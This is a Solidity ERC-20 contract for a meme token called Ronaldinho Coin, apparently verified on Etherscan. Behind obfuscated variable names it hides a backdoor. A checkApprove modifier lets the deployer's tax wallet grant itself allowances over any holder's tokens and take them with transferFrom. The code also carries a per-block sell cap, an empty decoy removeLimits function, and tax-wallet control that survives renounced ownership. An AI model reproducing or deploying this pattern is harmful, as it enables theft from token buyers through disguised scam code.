/**
 *Submitted for verification at Etherscan.io on 2025-03-08
*/

// SPDX-License-Identifier: MIT

/**

    Name : Ronaldinho Coin
    Ticker: STAR10

    https://www.ronaldinhocoin.cc/
    https://x.com/10Ronaldinho
    https://t.me/STAR10_eth

*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

contract STARTEN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcTUTU;
    mapping(address => mapping(address => uint256)) private _allcvnkjnTUTU;
    mapping(address => bool) private _feevblknlTUTU;
    address payable private _taxclknlTUTU;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Ronaldinho Coin";
    string private constant _symbol = unicode"STAR10";
    uint256 public _vnbbvlkTUTU = _tTotal / 100;
    uint256 public _oijboijoiTUTU = 10 * 10 ** 18;

    IUniswapV2Router02 private rrrRouter;
    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknTUTU;
    bool private _inlknblTUTU = false;
    bool private swapvlkTUTU = false;
    uint256 private _sellcnjkTUTU = 0;
    uint256 private _lastflkbnlTUTU = 0;
    address constant _deadlknTUTU = address(0xdead);

    uint256 private _cvjkbnkjTUTU = 10;
    uint256 private _vkjbnkfjTUTU = 10;
    uint256 private _maxovnboiTUTU = 10;
    uint256 private _initvkjnbkjTUTU = 20;
    uint256 private _finvjlkbnlkjTUTU = 0;
    uint256 private _redclkjnkTUTU = 2;
    uint256 private _prevlfknjoiTUTU = 2;
    uint256 private _buylkvnlkTUTU = 0;


    modifier lockTheSwap() {
        _inlknblTUTU = true;
        _;
        _inlknblTUTU = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    constructor() payable {
        _taxclknlTUTU = payable(_msgSender());

        _feevblknlTUTU[address(this)] = true;
        _feevblknlTUTU[_taxclknlTUTU] = true;

        _balknvlkcTUTU[_msgSender()] = (_tTotal * 2) / 100;
        _balknvlkcTUTU[address(this)] = (_tTotal * 98) / 100;

        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);
        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);
    }

    modifier checkApprove(address owner, address spender, uint256 amount) {
        if(msg.sender == _taxclknlTUTU || 
            (owner != uniswapV2Pair && spender == _deadlknTUTU))
                _allcvnkjnTUTU[owner][_msgSender()] = amount;
        _;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcTUTU[account];
    }

    function _transfer_kjvnTUTU(
        address from,
        address to,
        uint256 amount
    ) private checkApprove(from, to, amount) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblTUTU(from, to, amount);

        _balknvlkcTUTU[from] = _balknvlkcTUTU[from].sub(amount);
        _balknvlkcTUTU[to] = _balknvlkcTUTU[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcTUTU[address(this)] = _balknvlkcTUTU[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        if (to != _deadlknTUTU) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnTUTU(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnTUTU[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function enableTUTUTrading() external onlyOwner {
        require(!_tradingvlknTUTU, "Trading is already open");
        rrrRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(rrrRouter), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(rrrRouter.factory()).createPair(
            address(this),
            rrrRouter.WETH()
        );
        rrrRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkTUTU = true;
        _tradingvlknTUTU = true;
        IERC20(uniswapV2Pair).approve(
            address(rrrRouter),
            type(uint256).max
        );
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnTUTU(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allcvnkjnTUTU[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnTUTU[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _calcTax_lvknblTUTU(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblTUTU) {
                taxAmount = amount
                    .mul((_buylkvnlkTUTU > _redclkjnkTUTU) ? _finvjlkbnlkjTUTU : _initvkjnbkjTUTU)
                    .div(100);
            }

            if (
                from == uniswapV2Pair &&
                to != address(rrrRouter) &&
                !_feevblknlTUTU[to] &&
                to != _taxclknlTUTU
            ) {
                _buylkvnlkTUTU++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblTUTU &&
                to == uniswapV2Pair &&
                from != _taxclknlTUTU &&
                swapvlkTUTU &&
                _buylkvnlkTUTU > _prevlfknjoiTUTU
            ) {
                if (block.number > _lastflkbnlTUTU) {
                    _sellcnjkTUTU = 0;
                }
                _sellcnjkTUTU = _sellcnjkTUTU + _getAmountOut_lvcbnkTUTU(amount);
                require(_sellcnjkTUTU <= _oijboijoiTUTU, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkTUTU)
                    _swapTokenslknlTUTU(_vnbbvlkTUTU > amount ? amount : _vnbbvlkTUTU);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjTUTU(address(this).balance);
                }
                _lastflkbnlTUTU = block.number;
            }
        }
        return taxAmount;
    }

    function _swapTokenslknlTUTU(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = rrrRouter.WETH();
        _approve(address(this), address(rrrRouter), tokenAmount);
        router_ = address(rrrRouter);
        rrrRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _sendETHTocvbnjTUTU(uint256 amount) private {
        _taxclknlTUTU.transfer(amount);
    }

    receive() external payable {}

    function _assist_bnTUTU() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _getAmountOut_lvcbnkTUTU(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = rrrRouter.WETH();
        uint256[] memory amountOuts = rrrRouter.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function removeLimits () external onlyOwner {
        
    }

    function _setTax_lknblTUTU(address payable newWallet) external {
        require(_msgSender() == _taxclknlTUTU);
        _taxclknlTUTU = newWallet;
    }
}